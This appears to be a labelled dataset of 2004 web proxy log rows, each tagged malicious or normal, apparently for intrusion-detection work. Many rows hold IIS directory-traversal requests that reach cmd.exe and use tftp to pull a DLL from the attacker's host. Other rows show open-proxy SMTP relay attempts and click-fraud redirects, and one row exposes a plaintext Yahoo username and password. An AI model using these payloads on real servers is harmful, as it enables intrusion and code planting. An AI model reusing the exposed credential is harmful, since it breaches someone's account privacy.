rowIndex, row, class
217, 218.68.219.92 - - [09/Mar/2004:22:51:13 -0500] "GET http://www.searchaddicts.com/cgi-bin/sf.cgi?t=rp&keys=hnfzaafpaafpzpxdamfzfddddfdkcvcxdndsdfdkdfznhozcahdydxdismadhsxdaofnsmdaaxsnzpcnzhscfofpdzdhxzcsaizmscdozkfdhochfxdyzidzaxdzxhcifzfosmdafodaaxcoapfifodfzvsnxcxdzxfzsmdaznfpaxcofxsydmdffkdhxhcizxscfodhfkdhhyxdaoskfodhfkdhhyxdaodsaadxdyzvhyxdaofnsmdaaxsnzpcnzhscfofpdyzvaxckapfifodfzvsnxcxdaosksmdaznfpaxcofxsydmdffkdhxhcizxscfodhfkdhhyxdaoskfodhfkdhhyxdaodsaadzfodacyczapsxscsssvshhohvsadddxsfspsacocpaddyscakscacahchafzyfodhfmzvcszxaxdyscdoazfcazxsazdyscsssvdvahhvayazdcdismzvxdzcaasczkdosmzvcazcaydyscfvavdacozxzxfodxfvzisvxdczaksxscdoazssazhnzhzxasfvzpdkxfhnzcsmfnamdfapcozczfdydfdkdoaoxoxndndaasffshfvzpszdndsdfdkddacxfxpaksidzzzzpdhafcpfkdsdfdkdfznhozcahdydxdismdocvcxdadnsisvfdaahdxpzxfidnayahdahoxsaxzmdcakapfxcozcsdsyfndaaadvahchsdfodddkdfdkcvcxdndsdfdkdfdkhdcdszdsdfdkdddkcvcxdnfzaafpaafpzpxdamfzfdddzasnzchysyzaszaaspsvsnzkszsxahahskacsnhdazskhfaxaksvhazpszacaosfahsfzfsxskskspsvsihysnadahavamshzasvzfzahsafavsfahafhxzysssyzafafphcasavzchszizososczn&kw=casino HTTP/1.1" 302 722 "http://www.searchaddicts.com/cgi-bin/smartsearch.cgi" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)", m
218, 218.68.219.92 - - [09/Mar/2004:22:51:24 -0500] "GET http://click.revenuepilot.com/servlet/link?link=P_MzMzMzMzMAAAABAAAeWgAAAAAAAAAAABFhY2VzNGdhbWJsaW5nLmNvbQE1Fgn_lcSTAAZjYXNpbm8AAAAKP5R64UeuFHsBAAAA-zLlEyBADMzNAAN4bWwAxGh0dHA6Ly93d3cuZmluZGl0LXF1aWNrLmNvbS9jZ2ktbG9jYWwvc2VhcmNoL3IuZmNnaT9JRD1qY2smamNrPWdieXZjcmhhcmlyZUNDQzAxMkRERDcxMkRERDk1REREOTdDQ0M4NjcxMDk5ODEyT09PMDk3NzkxNjIxMk9PTzAxMkRERDcxMkRERDk1REREOTdDQ0M4NjM1MDk5ODEyQ0NDNjFEREQxQ0NDYmF2Zm5wVFRUMDk3NzkxNjIxMjpjYXNpbm8AAAAAAAAAP_MzMzMzMzM. HTTP/1.1" 302 234 "http://www.searchaddicts.com/cgi-bin/sf.cgi?t=rp&keys=hnfzaafpaafpzpxdamfzfddddfdkcvcxdndsdfdkdfznhozcahdydxdismadhsxdaofnsmdaaxsnzpcnzhscfofpdzdhxzcsaizmscdozkfdhochfxdyzidzaxdzxhcifzfosmdafodaaxcoapfifodfzvsnxcxdzxfzsmdaznfpaxcofxsydmdffkdhxhcizxscfodhfkdhhyxdaoskfodhfkdhhyxdaodsaadxdyzvhyxdaofnsmdaaxsnzpcnzhscfofpdyzvaxckapfifodfzvsnxcxdaosksmdaznfpaxcofxsydmdffkdhxhcizxscfodhfkdhhyxdaoskfodhfkdhhyxdaodsaadzfodacyczapsxscsssvshhohvsadddxsfspsacocpaddyscakscacahchafzyfodhfmzvcszxaxdyscdoazfcazxsazdyscsssvdvahhvayazdcdismzvxdzcaasczkdosmzvcazcaydyscfvavdacozxzxfodxfvzisvxdczaksxscdoazssazhnzhzxasfvzpdkxfhnzcsmfnamdfapcozczfdydfdkdoaoxoxndndaasffshfvzpszdndsdfdkddacxfxpaksidzzzzpdhafcpfkdsdfdkdfznhozcahdydxdismdocvcxdadnsisvfdaahdxpzxfidnayahdahoxsaxzmdcakapfxcozcsdsyfndaaadvahchsdfodddkdfdkcvcxdndsdfdkdfdkhdcdszdsdfdkdddkcvcxdnfzaafpaafpzpxdamfzfdddzasnzchysyzaszaaspsvsnzkszsxahahskacsnhdazskhfaxaksvhazpszacaosfahsfzfsxskskspsvsihysnadahavamshzasvzfzahsafavsfahafhxzysssyzafafphcasavzchszizososczn&kw=casino" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", m
219, 68.48.142.117 - - [09/Mar/2004:22:51:39 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
220, 68.48.142.117 - - [09/Mar/2004:22:52:32 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
221, 192.117.242.67 - - [09/Mar/2004:22:52:52 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
222, 68.48.142.117 - - [09/Mar/2004:22:53:23 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
223, 24.168.72.174 - - [09/Mar/2004:22:53:23 -0500] "GET http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus815&passwd=CHRIST HTTP/1.0" 200 566 "-" "-", n
224, 203.61.199.15 - - [09/Mar/2004:22:53:24 -0500] "HEAD http://www.bestobeast.com/members/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
225, 203.61.199.15 - - [09/Mar/2004:22:53:24 -0500] "HEAD http://www.bestobeast.com/members/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
226, 203.61.199.15 - - [09/Mar/2004:22:53:24 -0500] "HEAD http://www.bestobeast.com/members/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
227, 203.61.199.15 - - [09/Mar/2004:22:53:25 -0500] "HEAD http://www.bestobeast.com/members/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
228, 203.61.199.15 - - [09/Mar/2004:22:53:25 -0500] "HEAD http://www.bestobeast.com/members/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
229, 203.61.199.15 - - [09/Mar/2004:22:53:25 -0500] "HEAD http://www.bestobeast.com/members/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
230, 203.61.199.15 - - [09/Mar/2004:22:53:25 -0500] "HEAD http://www.bestobeast.com/members/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
231, 203.61.199.15 - - [09/Mar/2004:22:53:25 -0500] "HEAD http://www.bestobeast.com/members/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
232, 68.48.142.117 - - [09/Mar/2004:22:54:13 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
233, 217.136.205.206 - - [09/Mar/2004:22:54:46 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://members.asstraffic.com:80" "Mozilla/4.73 ( compatible; MSIE 5.0; Windows NT4.0; ezn IE )", n
234, 68.48.142.117 - - [09/Mar/2004:22:55:03 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
235, 68.48.142.117 - - [09/Mar/2004:22:55:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
236, 68.48.142.117 - - [09/Mar/2004:22:55:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
237, 68.48.142.117 - - [09/Mar/2004:22:55:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
238, 68.48.142.117 - - [09/Mar/2004:22:55:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
239, 68.48.142.117 - - [09/Mar/2004:22:55:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
240, 68.48.142.117 - - [09/Mar/2004:22:55:04 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
241, 68.48.142.117 - - [09/Mar/2004:22:55:04 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
242, 68.48.142.117 - - [09/Mar/2004:22:55:04 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
243, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
244, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
245, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 305 "-" "-", m
246, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
247, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
248, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", 
249, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
250, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c0%af../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
251, 68.48.142.117 - - [09/Mar/2004:22:55:05 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
252, 68.48.142.117 - - [09/Mar/2004:22:55:06 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
253, 68.48.142.117 - - [09/Mar/2004:22:55:06 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
254, 68.48.142.117 - - [09/Mar/2004:22:55:06 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
255, 68.48.142.117 - - [09/Mar/2004:22:55:06 -0500] "GET /scripts/..%c1%9c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
256, 68.48.142.117 - - [09/Mar/2004:22:55:06 -0500] "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-", m
257, 68.48.142.117 - - [09/Mar/2004:22:55:06 -0500] "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-", m
258, 203.121.182.142 - - [09/Mar/2004:22:55:08 -0500] "CONNECT 67.112.220.162:25 HTTP/1.0" 500 434 "-" "-", n
259, 192.117.242.67 - - [09/Mar/2004:22:55:09 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
260, 192.117.242.67 - - [09/Mar/2004:22:55:10 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
261, 68.48.142.117 - - [09/Mar/2004:22:55:56 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
262, 68.48.142.117 - - [09/Mar/2004:22:56:51 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
263, 68.48.142.117 - - [09/Mar/2004:22:57:41 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
264, 192.117.242.67 - - [09/Mar/2004:22:57:57 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
265, 61.172.244.232 - - [09/Mar/2004:22:58:25 -0500] "CONNECT 218.80.37.232:25 HTTP/1.0" 500 432 "-" "-", n
266, 68.48.142.117 - - [09/Mar/2004:22:58:32 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
267, 203.121.182.190 - - [09/Mar/2004:22:58:41 -0500] "\x04\x01" 501 - "-" "-", m
268, 220.173.17.142 - - [09/Mar/2004:22:59:18 -0500] "GET http://www.qksrv.net/image-1387261-808144.gif HTTP/1.1" 302 76 "http://www.qksrv.net" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
269, 220.173.17.142 - - [09/Mar/2004:22:59:19 -0500] "GET http://mirror.qkimg.net/0208/808144-13 HTTP/1.1" 200 11616 "http://www.qksrv.net" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
270, 68.48.142.117 - - [09/Mar/2004:22:59:22 -0500] "GET /scripts/..%25%35%63../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
271, 220.173.17.142 - - [09/Mar/2004:22:59:24 -0500] "GET http://www.qksrv.net/image-1387261-5835072.jpg HTTP/1.1" 302 76 "http://www.qksrv.net" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
272, 220.173.17.142 - - [09/Mar/2004:22:59:25 -0500] "GET http://mirror.qkimg.net/0320/5835072-9 HTTP/1.1" 200 9300 "http://www.qksrv.net" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
273, 220.173.17.142 - - [09/Mar/2004:22:59:26 -0500] "GET http://www.qksrv.net/image-1387261-1470383 HTTP/1.1" 302 81 "http://www.qksrv.net" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
274, 220.173.17.142 - - [09/Mar/2004:22:59:29 -0500] "GET http://mirror.qkimg.net/0943/1470383-10.gif HTTP/1.1" 200 3981 "http://www.qksrv.net" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
275, 68.48.142.117 - - [09/Mar/2004:23:00:12 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
276, 192.117.242.67 - - [09/Mar/2004:23:00:17 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
277, 192.117.242.67 - - [09/Mar/2004:23:00:17 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
278, 203.121.182.189 - - [09/Mar/2004:23:00:47 -0500] "CONNECT 218.17.231.179:25 HTTP/1.0" 500 436 "-" "-", n
279, 218.78.209.42 - - [09/Mar/2004:23:00:48 -0500] "CONNECT 155.230.30.13:25 HTTP/1.0" 200 - "-" "-", n
280, 68.48.142.117 - - [09/Mar/2004:23:01:02 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
281, 68.48.142.117 - - [09/Mar/2004:23:01:52 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
282, 220.175.18.42 - - [09/Mar/2004:23:02:19 -0500] "GET http://www.samair.ru/proxy/proxychecker/results.htm HTTP/1.0" 200 3923 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
283, 220.175.18.42 - - [09/Mar/2004:23:02:25 -0500] "GET http://www.stayinvisible.com/index.pl/ip_test_result_nocache HTTP/1.0" 200 8030 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
284, 220.175.18.42 - - [09/Mar/2004:23:02:29 -0500] "GET http://www.sanisearch.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=Health+Insurance HTTP/1.0" 200 27302 "http://www.yourwindow.com/sanisearch.htm" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)", n
285, 220.175.18.42 - - [09/Mar/2004:23:02:37 -0500] "GET http://www.sanisearch.com/cgi-bin/sf.cgi?t=dj&keys=svakhkzsaoskhasdsvhpamzmachxzxachxahsnznsmsmzkhahcsnspsvzhhvhdsdahahzasfzoszhcsxaxsksvsnsozfzcazzshizsaosczyszskzvsxzczmansphkxcxzhkazzaaxsxzohvafhazo&kw=health+insurance&keys2=zidvdpdzhxhpzhhpayaxassphfzosfzpsoaxdfhczasohdzxaoafsihdhchpafayzihvhshchzzmxcaphmasahaxsdsvzaayzizzhchzhozpasapznhddfhczaskhahdsoskdshczasxhxhysxaadshxzaanzazxsoskdshxzashzhhvhsscshsmaxassvhmskaxspssacavxzamhmdfhazsfpzisfzpavscacdhhdhpxcaphmsxszfphxhphczzsxdshszsafaicnaphmhhdfhczasyzzcczozzhfdzhxhpzhzpdahfzchadhzisfhvavfkhszsdhzisfzmavfkhszsdhzisfznaofkhszssmzkhzaihshzadhfhisoadavzpzyhahhhfzmsvaaaahahmdzhxhphahydahfzchahhzkacapzkhahadzhxhphchmdahfzchohczmadaizydshszssksxcnaphmhchphhhhznacxnzozzavaifmzisfapzchhhshcdhzisfzxsxfkhszshsfkazsiskszfihczazkxcaphmsdscfphxhpzfzydodshszssaaixzamhmahsadchchphozmskzyszssspshzahaaisdapzmskahzoxpzizzdshxzadaazsiaoscszashvsczfzazhsfavsmzfsohxznasszsmsdshsvsihiavansoaxaadaazsidshfzchhhxzksvayzihdzohdhahaakaydshfzcfmhxhpadayzyhfhchchhzcayaazvhahfhnsnaphhzaaphpssaysphvhozmskzyszsdspsiznsxsiaaahsisasozaazayaxsoayscskaizpszsyzhhxhfziahayzohzhxhohvaphxafaoamsozdhczvazamznhfhchahizfhhzkasszhnscakaasaavzdadafsxazzzzzhdaszxhfhnacaizmzkzhsfavsmzfznayavzvhnhkazdfapzhhnayadsphksxshzvsyzkhvhhhohozfhchyamadsfsfsaaazzacaosxazzmsfanhkzaanadscsczmshzhhvhsavaaaxasadhosxanszaaszsdapzvzphazkhvscsdanhfazsxszsmzdacaxhkzcscaasassakaahfzyzddsdhzdhcziaxsxzkhiafadsm&kw=health+insurance HTTP/1.0" 302 1533 "http://www.sanisearch.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)", m
286, 68.48.142.117 - - [09/Mar/2004:23:02:43 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
287, 220.175.18.42 - - [09/Mar/2004:23:02:43 -0500] "GET http://www.djump2it.com/cgi-bin/search/sf.cgi?t=mg&keys=zidvdpdzhxhpzhhpayaxassphfzosfzpsoaxdfhczasohdzxaoafsihdhchpafayzihvhshchzzmxcaphmasahaxsdsvzaayzizzhchzhozpasapznhddfhczaskhahdsoskdshczasxhxhysxaadshxzaanzazxsoskdshxzashzhhvhsscshsmaxassvhmskaxspssacavxzamhmdfhazsfpzisfzpavscacdhhdhpxcaphmsxszfphxhphczzsxdshszsafaicnaphmhhdfhczasyzzcczozzhfdzhxhpzhzpdahfzchadhzisfhvavfkhszsdhzisfzmavfkhszsdhzisfznaofkhszssmzkhzaihshzadhfhisoadavzpzyhahhhfzmsvaaaahahmdzhxhphahydahfzchahhzkacapzkhahadzhxhphchmdahfzchohczmadaizydshszssksxcnaphmhchphhhhznacxnzozzavaifmzisfapzchhhshcdhzisfzxsxfkhszshsfkazsiskszfihczazkxcaphmsdscfphxhpzfzydodshszssaaixzamhmahsadchchphozmskzyszssspshzahaaisdapzmskahzoxpzizzdshxzadaazsiaoscszashvsczfzazhsfavsmzfsohxznasszsmsdshsvsihiavansoaxaadaazsidshfzchhhxzksvayzihdzohdhahaakaydshfzcfmhxhpadayzyhfhchchhzcayaazvhahfhnsnaphhzaaphpssaysphvhozmskzyszsdspsiznsxsiaaahsisasozaazayaxsoayscskaizpszsyzhhxhfziahayzohzhxhohvaphxafaoamsozdhczvazamznhfhchahizfhhzkasszhnscakaasaavzdadafsxazzzzzhdaszxhfhnacaizmzkzhsfavsmzfznayavzvhnhkazdfapzhhnayadsphksxshzvsyzkhvhhhohozfhchyamadsfsfsaaazzacaosxazzmsfanhkzaanadscsczmshzhhvhsavaaaxasadhosxanszaaszsdapzvzphazkhvscsdanhfazsxszsmzdacaxhkzcscaasassakaahfzyzddsdhzdhcziaxsxzkhiafadsm&kw=health%20insurance HTTP/1.0" 302 820 "http://www.sanisearch.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)", m
288, 220.175.18.42 - - [09/Mar/2004:23:02:45 -0500] "GET http://partners.mygeek.com/presults.jsp?partnerid=98680&vendorId=97087&type=1&code=0&rate=845362362&cr=845362362&domain=service.bfast.com&query=1078891353164%3A%3A69.56.226.130%3A%3Ahealth+insurance&url=http%3A%2F%2Fwww.looksmart.com%2Fog%2Fpr%3DPsr%3Bro%3D1%3Brc%3D4%3Bla%3D33483%3Blm%3D171097%3Bkw%3D154428%3Bed%3D20031114%3Bii%3D80b8.4602.404e87c5.5f1b%3Bpn%3D%3Bto%3D%3Btc%3D4%3Bpo%3D1%3Bpc%3D4%3Bpi%3Dlzd%3Bts%3D%7Chttp%3A%2F%2Fservice.bfast.com%2Fbfast%2Fclick%3Fbfmid%3D26375915%26siteid%3D40338265%26bfpage%3Difp%26bfinfo%3DLK2 HTTP/1.0" 302 511 "http://www.sanisearch.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)", m
289, 220.175.18.42 - - [09/Mar/2004:23:02:46 -0500] "GET http://www.looksmart.com/og/pr=Psr;ro=1;rc=4;la=33483;lm=171097;kw=154428;ed=20031114;ii=80b8.4602.404e87c5.5f1b;pn=;to=;tc=4;po=1;pc=4;pi=lzd;ts=|http://service.bfast.com/bfast/click?bfmid=26375915&siteid=40338265&bfpage=ifp&bfinfo=LK2 HTTP/1.0" 302 281 "http://www.sanisearch.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)", n
290, 220.175.18.42 - - [09/Mar/2004:23:02:46 -0500] "GET http://service.bfast.com/bfast/click?bfmid=26375915&siteid=40338265&bfpage=ifp&bfinfo=LK2 HTTP/1.0" 302 374 "http://www.sanisearch.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)", n
291, 220.175.18.42 - - [09/Mar/2004:23:02:47 -0500] "GET http://service.bfast.com/bfast/click?bfmid=26375915&siteid=40338265&bfpage=ifp&bfinfo=LK2&bfcookietest=Y HTTP/1.0" 302 357 "http://www.sanisearch.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)", n
292, 220.175.18.42 - - [09/Mar/2004:23:02:50 -0500] "GET https://www.ehealthinsurance.com/ehi/Alliance?sourceid=0040338265qDRcQE6TnFXoAmeDWTy1&allid=Bef8047 HTTP/1.0" 200 13227 "http://www.sanisearch.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=Health+Insurance" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 2000)", n
293, 192.117.242.67 - - [09/Mar/2004:23:03:02 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
294, 221.7.192.11 - - [09/Mar/2004:23:03:13 -0500] "GET http://ccbbs.cn/index.asp HTTP/1.1" 200 12711 "http://ccbbs.cn/index.asp" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
295, 220.173.17.142 - - [09/Mar/2004:23:03:15 -0500] "POST http://www.clickcheaper.com/search.php HTTP/1.1" 200 19472 "http://www.163.net" "Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)", n
